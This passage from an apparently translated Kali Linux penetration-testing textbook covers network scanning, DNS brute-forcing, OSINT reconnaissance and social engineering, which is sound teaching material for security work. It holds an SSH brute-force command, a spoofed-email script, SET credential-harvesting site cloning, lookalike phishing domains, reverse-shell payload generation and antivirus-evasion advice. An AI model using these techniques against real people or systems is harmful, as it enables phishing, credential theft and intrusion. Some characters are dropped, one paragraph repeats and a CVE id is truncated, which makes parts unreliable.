  \ Windows 7 -10 microsoft-ds (workgroup: WORKGROUP)\nMAC Address: 00:0C:29:1C:0E:EE\
  \ (VMware)\nService Info: Host: WIN7LAB; OS: Windows; CPE: cpe:/o:microsoft:windows\n\
  \nHost script results:\n|_smb-vuln-ms10-05: false\n|_smb-vuln-ms10-06: NT_STATUS_ACCESS_DENIED\n\
  | smb-vuln-ms17-010: \n\n| VULNERABLE:\n| Remote Code Execution vulnerability in\
  \ Microsoft SMB1 servers (ms17-010)\n|   State: VULNERABLE\n|   IDs: CVE:CVE-2017-043\n\
  |   Risk factor: HIGH\n|     A critical remote code execution vulnerability exists\
  \ in Microsoft SMB1\n|       servers (ms17-010).\n| \n|   Disclosure date: 2017-03-14\n\
  |   References:\n|     https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n\
  \     https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|_   \
  \ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-043\n\nService detection\
  \ performed. Please report any incorrect results at https://nmap.org/submit/ .\n\
  Nmap done: 1 IP address (1 host up) scanned in 12.60 seconds\n```\n\n## NSE 参数\n\
  \n某些 NSE 脚本需要你输入额外的参数。一个很好的例子是破解攻击。假设你想对目标主机上的 SSH 服务进行破解，你需要添加 `--script-args`\
  \ 参数来识别用户名/密码文件：\n\n```\n $nmap -p 22 -sV –script ssh-brute –script-args userdb=users.txt,\
  \ passdb=passwords.txt\n```\n\n了解所有这些选项的秘密在于使用 Nmap 官方 NSE 参考：\n\n`https://nmap.org/nsedoc/`\n\
  \n## DNS 举\n\n为什么这一部分在网络扫描章节中？DNS 举可能允许我们识别想要扫描的目标主机的性质。此外，DNS 举将使用公共搜索引擎来搜索我们在任务开始时未察觉的隐藏域名。例如，`router.ethicalhackingblog.com`\
  \ 目标可能是一个路由器主机（`ethicalhackingblog.com` 是我的域名；我只是举例）。\n\n### DNS 暴力破解\n\n有很多工具可以使用暴力破解方法搜索\
  \ DNS 域名。首先，让我们尝试通过开发自己的 Bash 脚本来理解 DNS 暴力破解是如何工作的。首先，让我们保存一个可能存在的子域名列表：\n\n*  \
  \ `www`\n\n*   `vpn`\n\n*   `prod`\n\n*   `api`\n\n*   `dev`\n\n*   `ftp`\n\n* \
  \  `staging`\n\n*   `mail`\n\n现在我们已经定义了子域名字典文件，是时候编写 Bash 脚本了：\n\n\n\n\n\n```bash\n\
  #! /bin/bash\n#此脚本将对域名进行暴力破解\n\n### 提示用户输入要破解的域名\nread -p \"Enter the domain name\
  \ that you want to brute-force: \" DOMAIN_NAME\n\nfunction check_domain(){\n   \
  \     #执行 host 命令并提取活跃子域名\n        results=$(host $SUB_DOMAIN | grep 'has address')\n\
  \        #如果结果为空\n        if [[ -n $results ]]\n        then\n               printf\
  \ \"Found $SUB_DOMAIN\\n\"\n        fi\n}\n\n#读取字典文件\nfor sub in $(cat sub-d.txt)\n\
  do\n       SUB_DOMAIN=$sub.$DOMAIN_NAME\n       check_domain\ndone\n```\n\n让我们在博客网站上测试一下它：\n\
  \n```\nroot@kali:/opt# ./dns-brute.sh \nEnter the domain name that you want to brute-force:\
  \ ethicalhackingblog.com\nFound www.ethicalhackingblog.com\nFound ftp.ethicalhackingblog.com\n\
  ```\n\n### DNS 区域传输 (DNS Zone Transfer)\n\n将 DNS 主服务器的记录复制到另一个 DNS 从用服务器被称为 `DNS\
  \ transfer`（DNS 传输）。我们可以利用这一过程，通过向主 DNS（通常称为 NS 服务器，例如 [`ns1.ethicalhackingblog.com`](http://ns1.ethicalhackingblog.com)\
  \ ）请求目标域名的列表，从而获取所有子域名的列表。这种查询很少能成功，但如果成功了，你将获得一份包含所有子域名及其关联 IP 地址的礼物。\n\n首先，让我们获取一个随机域名的\
  \ `ns` 服务器列表：\n\n```\n$host -t ns [domain name] | cut -d \" \" -f 4\nroot@kali:/opt#\
  \ host -t ns google.com | cut -d \" \" -f 4\nns4.google.com.\nns3.google.com.\n\
  ns1.google.com.\nns2.google.com.\n```\n\n现在我们知道了 DNS 服务器的列表，可以向服务器请求 DNS 记录。让我们尝试使用\
  \ `host` 命令询问 `ns1` 服务器：\n\n```\n$host -l [domain name] [ns server domain name]\n\
  \nroot@kali:/opt# host -l google.com ns1.google.com\nUsing domain server:\nName:\
  \ ns1.google.com\nAddress: 216.239.32.10#53\nAliases: \n\n; Transfer failed.\n```\n\
  \n现在你已经了解了 Bash 脚本是如何工作的，你可以创建自己的脚本来提取 `ns` 服务器列表，然后循环访问到每一个服务器，最后使用前面指定的区域传输技术来请求\
  \ DNS 记录列表。现在你已经理解了 Bash 脚本的使用和威力。\n\n### DNS 子域名工具\n\n市上有许多工具可以扫描子域名。重要的是理解它们是如何作用的，因此你需要确保你所选的工具能够执行以下操作：\n\
  \n1. 基于高质量的字典文件快速暴力破解子域名。\n2. 检查是否存在 DNS 传输。\n3. 在 Google 等互联网搜索引擎上自动进行子域名查询。\n\n\
  #### Fierce\n\nFierce 是一个搜索子域的优秀工具。Fierce 会执行多次 DNS 测试，包括区域传输和暴力破解。它非常快且包含一个良好的字典文件：\n\
  \n```\n$fierce -dns [domain name]\n\nroot@kali:/opt# fierce -dns ethicalhackingblog.com\n\
  DNS Servers for ethicalhackingblog.com:\n        ns66.domaincontrol.com\n      \
  \  ns65.domaincontrol.com\n\nTrying zone transfer first…\n        Testing ns66.domaincontrol.com\n\
  \                Request timed out or transfer not allowed.\n        Testing ns65.domaincontrol.com\n\
  \                Request timed out or transfer not allowed.\n\nUnsuccessful in zone\
  \ transfer (it was worth a shot)\nOkay, trying the good old fashioned way… brute\
  \ force\n\nChecking for wildcard DNS…\nNope. Good.\nNow performing 2280 test(s)…\n\
  45.40.155.145   ftp.ethicalhackingblog.com\n45.40.155.145   www.ethicalhackingblog.com\n\
  \nSubnets found (may want to probe here using nmap or unicornscan):\n 45.40.155.0-255\
  \ : 2 hostnames found.\n\nDone with Fierce scan: http://ha.ckers.org/fierce/\nFound\
  \ 2 entries.\n\nHave a nice day.\n```\n\n不要只依赖一个工具来完成任务；每个工具都有其优缺点。在搜索子域名时，还可以考虑其他优秀的\
  \ DNS 工具：\n\n```\n#sublist3r 在 Github 上\n$python sublist3r.py [domain name]\n#subbrute\
  \ 在 Github 上\n$python subbrute.py [domain name]\n```\n\n### 总结\n\n你刚刚学习了渗透测试阶梯上的第一步。理想情况下，你喜欢这一章并学到了一些新知识。在接下来的章节中，我们将利用网络扫描获得的信息来利用目标主机。朋友们，乐趣才刚刚开始！\n\
  \n# 第 4 章\n\n## 互联网信息收集\n\n永远不要低估渗透测试中信息收集阶段的重要性。我承认我过去也低估了它，但多年来，我意识到这个阶段是多么重要。有一次我在参与一个尚未部署到生产环境的项目，所以从实践上说，当时没有任何信息可用。\n\
  \n本章的重点是渗透测试的主要方法论。你不应该在盲目运行扫描器的情况下不知道要寻找什么。我们在上一章中已经讨论过的步骤之一是搜索子域名。如果你需要复，可以回到上一章。\n\
  \n在本章中你将学习到：\n\n- 使用搜索引擎\n- 使用 Shodan\n- 使用 Google 查询\n- 如何使用 Whois 显示域名信息\n- 了解\
  \ Kali 上的关键足迹工具如何工作，包括 `TheHarvester`、`Dmitry` 和 `Maltego`\n\n## 被动足迹探测与侦察\n\n让我们定义一下该主题的一些术语。通过互联网公开信息被动收集信息有许多技术名称。有些人称之为\
  \ `reconnaissance`（侦察），另一些人称为 `passive footprinting`（被动足迹）或 `passive information\
  \ gathering`（被动信息收集）。有时你会听到 OSINT，它是 `open source intelligence`（开源情报）。可以使用你喜欢的任何技术术语，但确保不要混淆这些术语，因为它们的意思都是使用公开来源收集目标数据。不要混淆\
  \ `footprinting` 和 `fingerprinting`（指纹识别）的区别，因为后者用于识别操作系统。被动足迹中最关键的任务之一是知道你要寻找什么。有很多工具可以完成工作，但你需要理解它们在后台是如何运行的。因此，以下是在执行信息收集任务时需要查找的项目列表：\n\
  \n- 公司子域名\n- 网站\n- 公共 IP 地址（包括云端的 AWS/Azure）\n- 泄的内部 IP 地址\n- 公共 DNS 记录（如 MX 邮件记录等）\n\
  - 泄露的凭据（主要在 GitHub 或 Pastebin 上）\n- 之前的泄露事件\n- 重大业务变更（例如收购）\n- 业务财务信息（这可能揭示合作伙伴）\n\
  - 业务电话（用于社会工程学）\n- 员工公开信息（用于社会工程）\n- 公司在社交媒体上的存在（例如 LinkedIn）\n\n\n\n\n\n公共搜索引擎是你进入搜索目标目标相关漏洞的切口。在下一节中，你将详细看到如何利用\
  \ `Google` 搜索引擎来获取所有必要的信息（泄露信息）。尽管如此，除了 Google 之外，还有许多你可以使用的搜索引擎。在你告诉这些搜索引擎你正在寻找什么之后，它们会引导你通向正确的方向。它们就像是一座金矿，能够揭示在野外关于你的目标泄露了哪些信息。以下是你应该加入武器工具箱的搜索引擎列表：\n\
  \n*   `Google 搜索引擎`: [`google.com`](http://google.com)\n*   `Shodan 在线扫描器`: [`shodan.io`](http://shodan.io)\n\
  *   `DuckDuckGo 搜索引擎`: [`duckduckgo.com`](http://duckduckgo.com)\n\n## Shodan\n\n\
  Shodan 是一个优秀的在线工具，可以帮助你扫描互联网。在这个“巨兽”上，你可以使用无限限制的选项。这里有一个简单的例子：假设你想找到互联网上可见并监听 `2375`\
  \ 端口（`Docker 守护进程` 的默认端口号）的 `Docker` 引擎。\n\n在图 4.1 所示的示例中，我使用了以下查询：\n\n```\n port:2375\
  \ product: \"Docker\"\n```\n\n![Shodan 屏幕截图。](img/c04f001.png)\n\n图 4.1 Shodan\n\
  \n这并不是你在 Shodan 网站上可以使用唯一查询标准。还有其他的；表 4.1 涵盖了最常用的标准。\n\n| 搜索过滤器 | 描述 | 示例 |\n| ---\
  \ | --- | --- |\n| Port | 端口号 | `Port:80` |\n| Product | 产品名称 | `Product: \"Apache\"\
  ` |\n| Org | 组织名称 | `Org: \"Target company name.\"` |\n| Country | 双字母国家名称 | `Country:CA`\
  \ |\n| City | 城市名称 | `City:Montreal` |\n| hostname | 域名 | `Hostname: \"domain‐name.com\"\
  ` |\n| Server | 服务器名称 | `Server: \"Linux\"` |\n| http.title | 网页标题 | `http.title:“Dashboard”`\
  \ |\n\n表 4.1 Shodan 网站上常用的查询标准\n\n你可以在 [`www.shodan.io/explore`](http://www.shodan.io/explore)\
  \ 查看一些实际示例。\n\n## Google 查询\n\nGoogle 是一个强大的搜索引擎，如果你知道如何正确使用它，它将让你找到正在寻找的信息（例如关于你的客户/雇主的泄露凭据）。Google\
  \ 让你能够使用高级过滤标准查询其数据库。有些人称之为 `Google 黑客攻击数据库` (GHDB)，而另一些人称之为 `Google dorks`。\n\n\
  让我们从我在任务开始总是使用的第一个 `site:` 查询开始，如图 4.2 所示。这个特定的查询将允许你查找与你的目标域名相关的所有网页和网站（此查询也将揭示子域名）。\n\
  \n![Google Dork 站点过滤器截图。](img/c04f002.png)\n\n图 4.2 Google Dork 站点过滤器\n\n如今，一切都公开发在\
  \ GitHub 上。这里有一个你可以在 Google 上使用的有趣查询，用于查找发布在 GitHub 上的敏感信息。图 4.3 显示了在使用 [`GitHub.com`](http://github.com)\
  \ 关键词 `Gus Khaja` 时查询出的几个结果：\n\n`site:` [`github.com`](http://github.com) `[keywords]`\n\
  \n![带有描述的 Google Dork 站点过滤器。](img/c04f003.png)\n\n图 4.3 描述\n\n这只是一个简单的例子，但你会对你在\
  \ GitHub 上发现泄露信息的次数感到惊讶。开发者往往在用 GitHub 时不考虑后果，而你作为该领域的专业人士可以利用这一漏洞。表 4.2 列出了你可以在\
  \ Google 中使用的其他有趣的查询。\n\n| 查询 | 描述 | 示例 |\n| --- | --- | --- |\n| `inurl:[criteria]`\
  \ | 在 URL 中搜索文本 | 在网站中搜索 SQLi 候选：`n site:[domain] inurl:?id=` |\n| `intitle:[criteria]`\
  \ | 在标题中搜索文本 | 搜索 CCTV：`n intitle:\"index of\" \"cctv\"` |\n| `filetype:[file extension]`\
  \ | 通过扩展名搜索文件类型 | 搜索连接的文件：`n site:[domain] filetype:pdf` |\n\n表 4.2\n\n## 使用 Shodan\
  \ 信息收集\n\nShodan 是一个优秀的在线工具，可以帮助你扫描互联网。在这个“巨兽”上，你可以使用无限限制的选项。这里有一个简单的例子：假设你想找到互联网上可见并监听\
  \ `2375` 端口（`Docker 守护进程` 的默认端口号）的 `Docker` 引擎。\n\n## Whois 数据库\n\n每个购买域名的实体（公司或个人）都被要求输入其个人信息。大部分这些信息将公开发。\n\
  \n\n\n\n\n* 注册者名称\n* 联系电话\n* 电子邮件地址\n* 实体物理地址\n* 域名过期日期\n* NS（名称服务器）服务器\n\n## TheHarvester\n\
  \n如果你打算进行社会工程学攻击或网络钓鱼演练，查找电子邮件地址至关重要。如果你是内部人员，确定电子邮件地址并不困难，因为你已经知道电子邮件的格式了（例如：`firstname.lastname@domain.tld`）。\n\
  \n现实中有很多用于此目的的工具。其中一个是一个老旧但依然非常出色的工具，被称为 `theHarvester`。该工具将使用像 `Google` 流行的搜索引擎来过滤结果：\n\
  \n```\n $theHarvester -d [domain] -b [online sources] -s\n\nroot@kali:~# theHarvester\
  \ -d ethicalhackingblog.com -b all -s\ntable results already exists\n\n*******************************************************************\n\
  * _ _ _                                                           *\n* | |_| |__\
  \ ___ /\\ /\\__ _ _ ____ _____ ___| |_ ___ _ __           *\n* | __| _ \\ / _ \\\
  \ / /_/ / _` | '__\\ \\ / / _ \\/ __| __/ _ \\ '__|   *\n* | |_| | | | | __ / /\
  \ __ / (_| | | \\ V V / __/\\__ \\ || __/ |          *\n* \\__|_| |_|\\___| \\/\
  \ /_/ \\__,_|_| \\_/ \\___||___/\\__\\___|_|        *\n*                       \
  \                                          *\n* theHarvester 3.1.0             \
  \                                 *\n* Coded by Christian Martorella           \
  \                        *\n* Edge-Security Research                           \
  \               *\n* cmartorella@edge-security.com                             \
  \      *\n*                                                                 *\n\
  ******************************************************************* \n\n[*] Target:\
  \ ethicalhackingblog.com \n\n[*] Searching Yahoo. \n[*] Searching CertSpotter. \n\
  \        Searching results.\n[*] Searching Intelx. \nAn exception has occurred in\
  \ Intelx search: `[Errno 2] No such file or directory: 'api-keys.yaml'`\n[*] Searching\
  \ Google. \n        Searching 0 results.\n        Searching 100 results.\n     \
  \   Searching 200 results.\n        Searching 300 results.\n        Searching 400\
  \ results.\n        Searching 500 results.\n[*] Searching Hunter. \n[*] Searching\
  \ VirusTotal. \n        Searching results.\n[*] Searching Baidu. \n\n[*] Searching\
  \ SecurityTrails. \n[*] Searching Threatcrowd. \n        Searching results.\n[*]\
  \ Searching Bing. \n[*] Searching Twitter usernames using Google. \n\n[*] Users\
  \ found: 3\n---------------------\n@GusKhawaja\n@keyframes\n@media\n[...]\n```\n\
  \n* `-d` 用于指定你的目标名称。（如果你使用如图所示的 [`ethicalhackingblog.com`](http://ethicalhackingblog.com)\
  \ 域名，如果发现没有结果请不要惊讶，因为该域名已针对此类攻击了防护。）\n* `-s` 用于在 Shodan 搜索引擎上进行搜索。\n* `-b` 是在线数据源名称；在图中，我选择了所有源。以下是你可以从中选择的列表（使用帮助命令\
  \ `-h` 可更多选项）：\n    * Baidu\n    * Bing\n    * bing API\n    * Certspotter\n   \
  \ * Crtsh\n    * DnsDumpster\n    * Dogpile\n    * Duckduckgo\n    * Github‐code\n\
  \    * Google\n    * Hunter\n    * Intelx\n    * Linkedin and Linkedin_links\n \
  \   * Netcraft\n    * Otx\n    * SecurityTrails\n    * Threatcrowd\n    * Trello\n\
  \    * Twitter\n    * Vhost\n    * VirusTotal\n    * Yahoo\n    * All（执行所有上述数据源）\n\
  \n## DMitry\n\nDMitry 意为“深度信息收集工具”，是另一个同时执行多项任务的应用程序：\n\n* `-w` : 执行 Whois 查询。\n\
  * `-n` : 从 [`Netcraft.com`](http://netcraft.com) 获取关于目标的记录。\n* `-s` : 查找子域名。\n*\
  \ `-e` : 搜索电子邮件地址。\n* `-p` : 扫描 TCP 开放端口（这不是被式的）。\n\n```\n root@kali:~# dmitry -wnse\
  \ [domain-name.com]\n```\n\n## Maltego\n\nMaltego 非常适合被动信息收集。人们可以为这个工具写一整本书，因为它包含了完成工作所需的一切。如果你想使用完整功能，必须支付年度许可费用。如果你是专业人士，这个工具是必不可少的，但你仍然可以使用限制版并获得一些不错的结果。\n\
  \n### Transform Hub\n\nTransform Hub 如图[图 4.6](#c04.xhtml_c04-fig-0006）所示，是 Maltego\
  \ 用于获取数据的网站集合（例如 Shodan、Kaspersky、Virus Total 等）。\n\n默认情况下，大多数此类数据源都没有安装；你必须点击你想要安装的每一个。数据源有多种类型：\n\
  \n* **单独付费**：你需要直接为这些网络服务付费；它们不包含内。\n* **免费**：其中许多源是免费的。\n* **身份验证**：某些服务需要账户。\n\
  \n### 创建图表\n\n图是 Maltego 的核心。在本节中，我们将可视化你可以从互联网查询的不同类型的信息。请注意，此演示显示的是 Maltego 4.2.9\
  \ 付版，但你可以在免费版中执行大部分场景。\n\n\n\n\n\n一些安全领域的人会使用像 `recon-ng` 的免费工具，其功能与 Maltego 执行的操作类似（`recon-ng`\
  \ 是一个用于信息收集的 Python 扫描器，使用网络 API 服务来获取数据）。出于教育目的，尝试这些免费工具并无大害。然而，如果一个组织正依赖你的工作，那么金钱就不应成为障碍；在这种情况下，建议利用年度许可的优势。这不仅适用于\
  \ Maltego，也适用于市面上绝大多数安全工具（例如 `Nessus`、`Burp Suite Pro` 等）。如果你想展示专业的成果，就必须支付相应的代价来正确完成工作。\n\
  \n### 总结\n\n信息收集是执行任务期间的主要组件之一。即使你不打算进行社会工程攻击，这个阶段也将让你对目标领域/公司产生一个不同的视角。网络上总是隐藏着一些秘密，如泄露的密码、机密数据等。凭借在本章中获得的所有知识，你应该能够像专业人士一样开始进行侦察。\n\
  \n# 第 5 章：社会工程攻击\n\n当我读书时，我通常讨厌那些不直奔主题的长篇引言。所以，让我们直入正题。在本章中，你将学习社会工程学以及帮助你利用人性弱点的不同技术。请注意，这本书是关于教你可以应用在\
  \ `Kali Linux` 上安装的任何工具中的原理。\n\n在本章中，你将学习社会工程学中的以下主题：\n\n*   发送钓鱼邮件\n*   窃取凭据\n\
  *   使用社会工程工具包 (SET)\n*   载荷和监听器的基础\n*   使用 USB Rubber Ducky 进行社会工程攻击\n\n## 鱼叉式钓鱼攻击\n\
  \n那么，什么是钓鱼呢？`Phishing`（钓鱼）是一种针对大量受害者进行的电子邮件欺诈攻击；它包含一个大众感兴趣的项目，以吸引人们对邮件采取行动。例如，它可能会广告赠送免费药品，并包含恶意链接或附件。攻击者利用概率，并依赖于某些人会点击链接或附件来发起攻击这一事实。我们大多数人可能都会删除恶意邮件，但我们可以假设会有人打开它。\n\
  \n`Spear phishing`（鱼叉式钓鱼）是一种具有高度针对性的钓鱼攻击形式。通过以特定的方式编写邮件，攻击者希望吸引特定受众（例如，公司的销售部、开发人员等）的注意。\n\
  \n例如，如果攻击者知道销售部使用特定的应用程序来管理客户关系，攻击者可能会伪造一封邮件，假装来自该应用程序的供应商，主题为“紧急”，并指示他们点击链接下载副本、补丁或更新。你认为会有多少销售代表点击那个链接呢？\n\
  \n### 发送电子邮件\n\n在我们进入实际示例之前，在向你的受害者发送电子邮件之前，有两个你需要了解的重要要点：\n\n*   首先，你需要一个 SMTP\
  \ 中继账户（我正在使用我的 GoDaddy 中继服务）。做些研究来找到适合你的的服务。\n*   你需要一封专业且有说服力的电子邮件，否则你的攻击将不可避免地失败。\n\
  \n### 社会工程工具包\n\n社会工程工具包 (`SET`，Social Engineering Toolkit）由安全领袖 David Kennedy 编写，旨在针对人性弱点执行高级攻击；这被称为\
  \ `social engineering`。`Kali Linux` 默认已预装了此工具。要运行它，你需要在终端窗口执行 `setoolkit`：\n\n```\n\
  root@kali:/# setoolkit\n```\n\n要发送电子邮件，请在第一个菜单中选择 Social-Engineering Attacks（社会工程攻击）：\n\
  \n```\n Select from the menu:\n\n  1) Social-Engineering Attacks\n  2) Penetration\
  \ Testing (Fast-Track)\n  3) Third-Party Modules\n  4) Update the Social-Engineer\
  \ Toolkit\n```\n\n要发送邮件，在第一个菜单中选择 Social-Engineering Attacks：\n\n```\n Select from\
  \ the menu:\n\n  1) Social-Engineering Attacks\n  ... (省略)\n  5) Update SET configuration\n\
  \  6) Help, and About\n\n99) Exit the Social-Engineer Toolkit\n\nset> 1\n```\n\n\
  接下来，选择 Mailer Attack（邮件攻击攻击）：\n\n```\n Select from the menu:\n\n  1) Spear-Phishing\
  \ Attack\n  2) Website Attack\n  3) Infectious Media\n  4) Create a Payload and\
  \ Listener\n  5) Mailer Attack\n  6) Arduino-Based Attack\n  7) Wireless Access\
  \ Point Attack\n  8) QRCode Generator Attack\n  9) Powershell Attack Vectors\n \
  \ 10) Third-Party Modules\n\n99) Return to the main menu.\n\nset> 5\n```\n\n在下一个窗口中，你可以将此邮件发送给一组人或个人。让我们看看我们的邮件攻击场景是怎样的样的。为了演示，假设你作为红队成员伪装成微软的代表，向管理员（公司道德黑客博客的员工）发送邮件，称管理员的机器需要更新。邮件包含一个管理员需要点击的恶意\
  \ URL。鱼叉式钓鱼攻击需要大量的规划，因此在发送之前考虑邮件的内容。\n\n回到 SET 菜单，我们将邮件发送给个人。选择选项 1：\n\n```\n What\
  \ do you want to do:\n\n 1 E-Mail Attack Single E-mail Address\n 2 E-Mail Attack\
  \ Mailer\n\n99 Return to the main menu.\n\nset:mailer>1\n```\n\n在这里，我们将邮件发送给 `ethicalhacking.com`\
  \ 的管理员。（记住用你自己的域名来测试这些练习。）\n\n```\nset:phishing>admin@ethicalhacking.com\n\n1 Use\
  \ a Gmail Account for your email.\n2 Use your own server or open relay\n\nset:phishing>2\n\
  ```\n\n当你看到之前的选项时，你会想要选择 Gmail，因为它是免费的，不需要中继账户，对吧？好吧，如果你尝试，Google 会乐意地封锁你的附件。所以总之，不要使用\
  \ Gmail。我们是专业的，对吧？不是脚本小子！由于我们使用中继账户，我们将选择选项 2。\n\n邮件应该来自微软。所以，填写中继信息。（这部分应该反映你的中继信息，而不是我的！）\n\
  \n#### 使用 Python 发送电子邮件\n\nPython 是在渗透测试中完成任务的一种很棒语言。在书的后续章节，你将学习这种编程语言的精髓。目前，以下代码展示了如何在不依赖应用程序的情况下发送电子邮件。你可以将其命名为\
  \ `sendemail.py` 并在填写缺失信息后运行它：\n\n\n\n\n\n```\n #Use the smtplib to send an e-mail\n\
  import smtplib\n#Configuration\n#Your e-mail address, the real one\nsender_email\
  \ = [sender email] \n#Your e-mail username\nusername = [smtp account username]\n\
  #Password required for your e-mail account\npassword = [Your SMTP account password]\n\
  #Spoofed e-mail information\n\nspoofed_email = [fake email address]\n#Spoofed full\
  \ name\nspoofed_name = 'John Doe'\n#Victim e-mail address \nvictim_email = [victim\
  \ email address] \n### E-mail subject \nsubject= \"this is a subject\\n\"\n### E-mail\
  \ body message\nbody = \"This is a body.\"\n\nheader = ('To:' + victim_email + '\\\
  n' +'From: ' + spoofed_name + ' <' + spoofed_email + '>' + '\\n' + 'Subject:' +\
  \ subject)\nmessage = (header + '\\n\\n' + body + '\\n\\n')\n\ntry:\n      session\
  \ = smtplib.SMTP_SSL([smtp server domain domain],[smtp server port number])\n  \
  \    session.ehlo()\n      session.login(username, password)\n      session.sendmail(sender_email,\
  \ victim_email, message)\n      session.quit()\n      print \"Email Sent With Success!\"\
  \nexcept smtplib.SMTPException:\n      print \"Error: Unable To Send The Email!\"\
  \n```\n\n### 窃取凭据\n\n现在是时候揭示你可以用于社会工程攻击的最有效且最高效的方法了。\n\n提醒一下：这并不是让你用来对朋友并窃取他们密码的教程。这是一本为想要学习如何在职业生涯中应用此类攻击的人编写专业书籍。\n\
  \n要开始这种攻击，你首先需要准备一个专业的 HTML 电子邮件，并确保受害者收到时不会产生任何怀疑。开发人员可以帮助你克隆网站并为其关联数据库，这样每当受害者提交凭据时，凭据就会保存在该数据库中。如果你想进行练习，可以使用\
  \ `SET` 来完成任务。打开并加载应用程序（你之前已经学会了如何执行和运行程序），并按照以下步骤操作：\n\n1. 选择选项 1：社会工程攻击 (Social-Engineering\
  \ Attacks)。\n2. 选择选项 2：网站攻击向量 (Website Attack Vectors)。\n3. 选择选项 3：凭据收割攻击方法 (Credential\
  \ Harvester Attack Method)。\n4. 选择选项 2：站点克隆器 (Site Cloner)。\n\n```\n set:webattack>\
  \ IP address for the POST back in Harvester/Tabnabbing [10.0.2.140]: [输入你的 Kali\
  \ IP 地址]\n[-] SET supports both HTTP and HTTPS\n[-] Example: http://www.thisisafakesite.com\n\
  set:webattack> Enter the url to clone:https://10.0.20.1/#/login\n[*] 正在克隆网站: [输入目标登录\
  \ URL] \n[*] 这可能需要一点时间… \n使用此攻击的最佳方法是存在用户名和密码表单字段。无论如何，它都会捕获网站上所有的 POST。\n[*] 社会工程工具\
  \ (SET) 凭据收割攻击正在运行\n[*] 凭据收割器正在端口 80 上运行\n[*] 信息将在到达时下方显示给你：\n```\n\n第二个重要部分是你将添加到电子邮件中的链接。混淆该\
  \ URL 的最佳方法是什么？简单的答案是创建一个域名，然后创建一个原始域名的副本子域名。以 [`Facebook.com`](http://facebook.com)\
  \ 域名为例。为了获得成功的结果，创建一个名称相似的假域名，如 [`Fcb.com`](http://fcb.com)，然后创建一个子域名 [`Facebook.com`](http://facebook.com)\
  \ 。它看起来应该是这样的：\n\n```\n facebook.fcb.com\n```\n\n我并没有鼓励你在测试中使用 Facebook。你没有 Facebook\
  \ 的许可来执行此操作。这只是一个示例。\n\n在实践中，红队和渗透测试人员需要使用雇主或客户的网站。一个极佳的示例是克隆客户/雇主的内网站点，这样你就可以窃取害者的域凭据。接下来，正如你在上一节看到的，向受害者发送电子邮件。理想情况下，你使用一封有说力的电子邮件引导员工点击\
  \ URL，该 URL 将员工重定向到伪站点。员工将开始输入凭据，当他们点击登录按钮时，会被重定向到真实网站。攻击者现在拥有了不幸受害者的凭据。\n\n###\
  \ 载荷与监听器\n\n在本节中，你将学习如何创建载荷 (payload) 和监听器 (listener)。如果你是完全初学者，在继续之前，这里有你需要注意的基础知识。\n\
  \n`payload` 是一个可执行程序，它允许你连接到 `listener`。目标是在受害者主机和攻击者之间建立一个 TCP 连接。一旦建立此连接，黑客就可以使用远程\
  \ shell 操纵害者的操作系统。该远程 shell 可以是绑定 shell (bind shell)也可以是反向 shell (reverse shell)。\n\
  \n## 绑定 shell vs. 反向 shell\n\n在继续阅读本书的下一章之前，理解绑定 shell 和反向 shell 之间的区别至关重要。许多安全爱好者和专业人士这两个概念的理解存在困惑。我们将使用一些实际示例来帮助你理解它们。\n\
  \n### 绑定 shell (Bind Shell)\n\n在绑定 shell 中，攻击者直接从 Kali 连接到受害者。\n\n### 反向 shell (Reverse\
  \ Shell)\n\n反向 shell 是渗透测试人员的最喜，你将在书中读到很多关于它的内容。该方法与绑定 shell 相反。在这种情况下，攻击者正在等待传入的连接。\n\
  \n\n\n\n在将有效负载（payload）发送到目标之前，你必须对其进行加密处理。换句话说，你要确保你的负载执行文件不会被受害者 PC 上安装的防病毒软件检测。确保将负载复制到另一台安装了相同类型杀毒软件的测试\
  \ PC 上。如果你不知道受害者主机上的是哪种杀毒软件，则必须上传你的负载并使用公共病毒扫描网站 VirusTotal 进行扫描（图 5.4）：\n\n[`www.virustotal.com/gui/home/upload`](http://www.virustotal.com/gui/home/upload)\n\
  \n![Virus Total 截图。](img/c05f004.png)\n\n图 5.4 Virus Total\n\n混淆负载的最佳方法是使用自定义负载。换句话说，你必须使用\
  \ `Python`、`PowerShell`、`C#` 等编程语言开发负载。你将在书中学习更多关于这个主题的内容，但目前，让我们看看如何使用 `SET` 生成负载。\n\
  \n首先，执行 `SET` 程序并选择以下选项：\n\n*   选择选项 1：社会工程攻击 (Social‐Engineering Attacks)\n*  \
  \ 选择选项 4：创建负载和监听器 (Create a Payload and Listener)\n*   选择选项 1：Windows Shell Reverse_TCP\n\
  \n接下来，你将被要求输入你的 Kali（攻击者）主机 IP 和你想监听的端口号。一旦完成，它将在 `/root/.set/payload.exe` 下生成负载。最后，你将被要求启动监听器。在我们的示例中，选择\
  \ `yes`：\n\n```\nset:payloads> IP address for the payload listener (LHOST):10.0.20.140\n\
  set:payloads> Enter the PORT for the reverse listener:7777\n[*] Generating the payload..\
  \ please be patient.\n[*] Payload has been exported to the default SET directory\
  \ located under/root/.set/payload.exe\nset:payloads> Do you want to start the payload\
  \ and listener now? (yes/no):yes\n[*] Launching msfconsole, this could take a few\
  \ to load. Be patient…\n```\n\n在此阶段，SET 会自动启动 Metasploit 多处理器监听器。我们将在书后面的部分深入探讨\
